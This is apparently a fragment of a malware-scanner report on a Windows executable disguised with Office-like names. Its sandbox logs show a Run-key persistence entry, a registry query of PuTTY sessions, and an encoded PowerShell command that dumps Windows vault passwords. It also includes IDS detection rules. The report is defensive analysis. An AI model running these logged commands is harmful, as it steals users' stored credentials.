                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=4200; EventType=SetValue; Image=C:\\ProgramData\\MicrosoftOffice2000\\OfficeTemplate.exe; ProcessGuid=C784477D-5D62-6374-D80A-000000004700; UtcTime=2022-11-16 03:48:09.376; Details=C:\\ProgramData\\MicrosoftOffice2000\\OfficeTemplate.exe; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftOffice}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "CurrentVersion Autorun Keys Modification",
                                                                       "rule_description":  "Detects modification of autostart extensibility point (ASEP) in registry.",
                                                                       "rule_author":  "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid=C784477D-5D9F-6374-E30A-000000004700; ProcessId=3632; Product=Microsoft Windows Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid=C784477D-5D79-6374-DB0A-000000004700; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\ProgramData\\MicrosoftOffice2000\\MicrosoftOfficeDashboard.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6436; CurrentDirectory=C:\\ProgramData\\MicrosoftOffice2000\\; CommandLine=cmd /Q /C powershell reg query HKCU\\Software\\SimonTatham\\Putty\\Sessions; EventID=1; LogonGuid=C784477D-2F9E-6372-F94C-040000000000; LogonId=281849; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\ProgramData\\MicrosoftOffice2000\\MicrosoftOfficeDashboard.exe; UtcTime=2022-11-16 03:48:47.274; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid=C784477D-5DA0-6374-E50A-000000004700; ProcessId=3824; Product=Microsoft Windows Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid=C784477D-5D9F-6374-E30A-000000004700; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3632; CurrentDirectory=C:\\ProgramData\\MicrosoftOffice2000\\; CommandLine=powershell  reg query HKCU\\Software\\SimonTatham\\Putty\\Sessions; EventID=1; LogonGuid=C784477D-2F9E-6372-F94C-040000000000; LogonId=281849; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=cmd /Q /C powershell reg query HKCU\\Software\\SimonTatham\\Putty\\Sessions; UtcTime=2022-11-16 03:48:48.373; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid=C784477D-5DA1-6374-E60A-000000004700; ProcessId=3928; Product=Microsoft Windows Operating System; Description=Registry Console Tool; Company=Microsoft Corporation; ParentProcessGuid=C784477D-5DA0-6374-E50A-000000004700; User=DESKTOP-B0T93D6\\george; Hashes=MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; OriginalFileName=reg.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3824; CurrentDirectory=C:\\ProgramData\\MicrosoftOffice2000\\; CommandLine=\"C:\\Windows\\system32\\reg.exe\" query HKCU\\Software\\SimonTatham\\Putty\\Sessions; EventID=1; LogonGuid=C784477D-2F9E-6372-F94C-040000000000; LogonId=281849; Image=C:\\Windows\\System32\\reg.exe; IntegrityLevel=High; ParentCommandLine=powershell  reg query HKCU\\Software\\SimonTatham\\Putty\\Sessions; UtcTime=2022-11-16 03:48:49.633; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "9459f67b1253cc08abbddb96a073b963a102b013d6fb679d6a0273540ad7b19f",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Enumeration for 3rd Party Creds From CLI",
                                                                       "rule_description":  "Detects processes that query known 3rd party registry keys that holds credentials via commandline",
                                                                       "rule_author":  "Nasreddine Bencherchali"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid=C784477D-5D91-6374-E10A-000000004700; ProcessId=2432; Product=Microsoft Windows Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid=C784477D-5D79-6374-DB0A-000000004700; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\ProgramData\\MicrosoftOffice2000\\MicrosoftOfficeDashboard.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6436; CurrentDirectory=C:\\ProgramData\\MicrosoftOffice2000\\; CommandLine=powershell /Q /C -encodedCommand WwB2AG8AaQBkAF0AWwBXAGkAbgBkAG8AdwBzAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAC4AUABhAHMAcwB3AG8AcgBkAFYAYQB1AGwAdAAsAFcAaQBuAGQAbwB3AHMALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMALABDAG8AbgB0AGUAbgB0AFQAeQBwAGUAPQBXAGkAbgBkAG8AdwBzAFIAdQBuAHQAaQBtAGUAXQA7ACQAdgBhAHUAbAB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABXAGkAbgBkAG8AdwBzAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAC4AUABhAHMAcwB3AG8AcgBkAFYAYQB1AGwAdAA7ACQAdgBhAHUAbAB0AC4AUgBlAHQAcgBpAGUAdgBlAEEAbABsACgAKQAgAHwAIAAlACAAewAgACQAXwAuAFIAZQB0AHIAaQBlAHYAZQBQAGEAcwBzAHcAbwByAGQAKAApADsAJABfAH0AIAB8ACAAUwBlAGwAZQBjAHQAIABVAHMAZQByAE4AYQBtAGUALAAgAFIAZQBzAG8AdQByAGMAZQAsACAAUABhAHMAcwB3AG8AcgBkACAAfAAgAEYAbwByAG0AYQB0AC0AVABhAGIAbABlACAALQBIAGkAZABlAFQAYQBiAGwAZQBIAGUAYQBkAGUAcgBzAA==; EventID=1; LogonGuid=C784477D-2F9E-6372-F94C-040000000000; LogonId=281849; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\ProgramData\\MicrosoftOffice2000\\MicrosoftOfficeDashboard.exe; UtcTime=2022-11-16 03:48:33.564; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "eb75f9de2201bfad4ef177dca85b0b8fa8e5a86ba2357af5301f72acbc5eb144",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Execution of Powershell with Base64",
                                                                       "rule_description":  "Commandline to launch powershell with a base64 payload",
                                                                       "rule_author":  "frack113"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=264; Image=C:\\Users\\george\\Desktop\\OfficeTemplate.exe; RuleName=EXE; CreationUtcTime=2022-11-16 03:47:45.455; UtcTime=2022-11-16 03:47:45.455; ProcessGuid=C784477D-5D4B-6374-D40A-000000004700; TargetFilename=C:\\ProgramData\\MicrosoftOffice2000\\OfficeTemplate.exe}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=4200; TargetFilename=C:\\ProgramData\\MicrosoftOffice2000\\MicrosoftOfficeDashboard.exe; RuleName=EXE; CreationUtcTime=2022-11-16 03:48:07.598; UtcTime=2022-11-16 03:48:07.598; ProcessGuid=C784477D-5D62-6374-D80A-000000004700; Image=C:\\ProgramData\\MicrosoftOffice2000\\OfficeTemplate.exe}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "b5386a23355681c43cfbd2f2ccfe4b16ed45324d0d7b5583487a9f302ee1e427",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Creation of an Executable by an Executable",
                                                                       "rule_description":  "Detects the creation of an executable by another executable",
                                                                       "rule_author":  "frack113"
                                                                   }
                                                               ],
                                    "crowdsourced_ids_results":  [
                                                                     {
                                                                         "rule_category":  "Misc activity",
                                                                         "alert_severity":  "low",
                                                                         "rule_msg":  "ET HUNTING EXE Base64 Encoded potential malware",
                                                                         "rule_raw":  "alert http $EXTERNAL_NET any -\u003e $HOME_NET any (msg:\"ET HUNTING EXE Base64 Encoded potential malware\"; flow:established,from_server; file.data; content:\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"; fast_pattern; content:!\"\u003chtml\"; nocase; content:!\"\u003cbody\"; nocase; content:!\"\u003cscript\"; nocase; reference:url,urlhaus.abuse.ch/url/319004/; classtype:misc-activity; sid:2029538; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2020_02_26, deployment Perimeter, former_category MALWARE, signature_severity Major, updated_at 2020_02_26;)",
                                                                         "rule_references":  [
                                                                                                 "https://urlhaus.abuse.ch/url/319004/"
                                                                                             ],
                                                                         "alert_context":  [
                                                                                               {
                                                                                                   "src_ip":  "208.67.104.95",
                                                                                                   "url":  "http://208.67.104.95/",
                                                                                                   "hostname":  "208.67.104.95",
                                                                                                   "src_port":  80
                                                                                               }
                                                                                           ],
                                                                         "rule_url":  "https://rules.emergingthreats.net/",
                                                                         "rule_source":  "Proofpoint Emerging Threats Open",
                                                                         "rule_id":  "1:2029538"
                                                                     },
                                                                     {
                                                                         "rule_category":  "Potentially Bad Traffic",
                                                                         "alert_severity":  "low",
                                                                         "rule_msg":  "TGI HUNT b64 exe in HTTP (UTF8)",
                                                                         "rule_raw":  "alert http any any -\u003e any any (msg:\"TGI HUNT b64 exe in HTTP (UTF8)\"; flow:established; content:\"TVqQAAMAAAAEAAAA//8AAL\"; fast_pattern; classtype:bad-unknown; sid:2610768; rev:1;)",
                                                                         "alert_context":  [
                                                                                               {
                                                                                                   "src_ip":  "208.67.104.95",
                                                                                                   "url":  "http://208.67.104.95/",
                                                                                                   "hostname":  "208.67.104.95",
                                                                                                   "src_port":  80
                                                                                               }
                                                                                           ],
                                                                         "rule_url":  "https://raw.githubusercontent.com/travisbgreen/hunting-rules/master/hunting.rules",
                                                                         "rule_source":  "Travis Green: Threat hunting rules",
                                                                         "rule_id":  "1:2610768"
                                                                     },
                                                                     {
                                                                         "rule_category":  "Potentially Bad Traffic",
                                                                         "alert_severity":  "low",
                                                                         "rule_msg":  "TGI HUNT b64 exe in TCP (UTF8)",
                                                                         "rule_raw":  "alert tcp any any -\u003e any any (msg:\"TGI HUNT b64 exe in TCP (UTF8)\"; flow:established; content:\"TVqQAAMAAAAEAAAA//8AAL\"; fast_pattern; classtype:bad-unknown; sid:2610776; rev:1;)",
                                                                         "alert_context":  [
                                                                                               {
                                                                                                   "src_ip":  "208.67.104.95",
                                                                                                   "url":  "http://208.67.104.95/",
                                                                                                   "hostname":  "208.67.104.95",
                                                                                                   "src_port":  80
                                                                                               }
                                                                                           ],
                                                                         "rule_url":  "https://raw.githubusercontent.com/travisbgreen/hunting-rules/master/hunting.rules",
                                                                         "rule_source":  "Travis Green: Threat hunting rules",
                                                                         "rule_id":  "1:2610776"
                                                                     },
                                                                     {
                                                                         "rule_category":  "policy-violation",
                                                                         "alert_severity":  "info",
                                                                         "rule_msg":  "POLICY-OTHER HTTP request by IPv4 address attempt",
                                                                         "rule_raw":  "alert tcp any any -\u003e any $HTTP_PORTS ( msg:\"POLICY-OTHER HTTP request by IPv4 address attempt\"; flow:to_server,established; http_header; content:\"Host:\",fast_pattern,nocase; pcre:\"/^Host\\x3a\\s*(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\\s*:?\\s*\\d*\\s*$/ims\"; service:http; reference:url,www.w3.org/Protocols/rfc2616/rfc2616-sec15.html; classtype:policy-violation; sid:50447; rev:1; )",
                                                                         "rule_references":  [
                                                                                                 "https://www.w3.org/Protocols/rfc2616/rfc2616-sec15.html"
                                                                                             ],
                                                                         "alert_context":  [
                                                                                               {
                                                                                                   "dest_ip":  "208.67.104.95",
                                                                                                   "dest_port":  80
                                                                                               }
                                                                                           ],
                                                                         "rule_url":  "https://www.snort.org/downloads/#rule-downloads",
                                                                         "rule_source":  "Snort registered user ruleset",
                                                                         "rule_id":  "1:50447"
                                                                     }
                                                                 ],
                                    "reputation":  0,
                                    "exiftool":  {
                                                     "MIMEType":  "application/octet-stream",
                                                     "Subsystem":  "Windows GUI",
                                                     "SubsystemVersion":  "6.1",
                                                     "MachineType":  "AMD AMD64",
                                                     "TimeStamp":  "0000:00:00 00:00:00",
                                                     "FileType":  "Win64 EXE",
                                                     "PEType":  "PE32+",
                                                     "CodeSize":  "2267136",
                                                     "InitializedDataSize":  "241152",
                                                     "FileTypeExtension":  "exe",
                                                     "LinkerVersion":  "3.0",
                                                     "ImageFileCharacteristics":  "Executable, Large address aware, No debug",
                                                     "EntryPoint":  "0x63b00",
                                                     "OSVersion":  "6.1",
                                                     "ImageVersion":  "1.0",
                                                     "UninitializedDataSize":  "0"
                                                 },
                                    "total_votes":  {
                                                        "harmless":  0,
                                                        "malicious":  0
                                                    },
                                    "magika":  "PEBIN",
                                    "sigma_analysis_stats":  {
                                                                 "high":  0,
                                                                 "medium":  3,
                                                                 "critical":  1,
                                                                 "low":  1
                                                             },
                                    "vhash":  "046066655d5d15541az27!z",
                                    "authentihash":  "57067921deb9c65e359be787a38073614f4fd6d8e439d8dd5fa7dca85d1fbf78",
                                    "filecondis":  {
                                                       "raw_md5":  "508e6576ad59e0e6b3cc40f11b313664",
                                                       "dhash":  "00383e3c3e2d1000"
                                                   },
                                    "last_analysis_stats":  {
                                                                "malicious":  54,
                                                                "suspicious":  0,
                                                                "undetected":  19,
                                                                "harmless":  0,
                                                                "timeout":  0,
                                                                "confirmed-timeout":  0,
                                                                "failure":  0,
                                                                "type-unsupported":  4
                                                            }
                                }
             }
}
